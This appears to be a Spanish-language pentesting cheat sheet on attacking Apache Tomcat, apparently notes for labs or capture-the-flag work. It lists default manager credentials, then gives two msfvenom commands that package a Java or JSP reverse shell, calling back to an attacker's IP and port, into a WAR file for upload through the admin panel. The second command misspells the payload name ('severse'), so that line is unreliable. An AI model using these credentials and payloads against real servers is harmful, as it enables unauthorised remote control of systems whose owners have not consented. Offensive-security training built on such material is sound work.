# Contraseñas por defecto Tomcat
- admin:admin
- tomcat:tomcat
- admin:
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

# Reverse Shell File Upload
Si conseguimos acceso al panel de administración, podemos usar la vulnerabilidad de File Upload para subir una reverse Shell.

Tenemos dos opciones de Payload para subir en un archivo WAR.
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<"IP Atancante"> LPORT=<"Puerto de conexion a la maquina atacante"> -f war -o pwned.war
```

```bash
msfvenom -p java/jsp_shell_severse_tcp LHOST=<"IP Atancante"> LPORT=<"Puerto de conexion a la maquina atacante"> -f war -o pwned.war
```
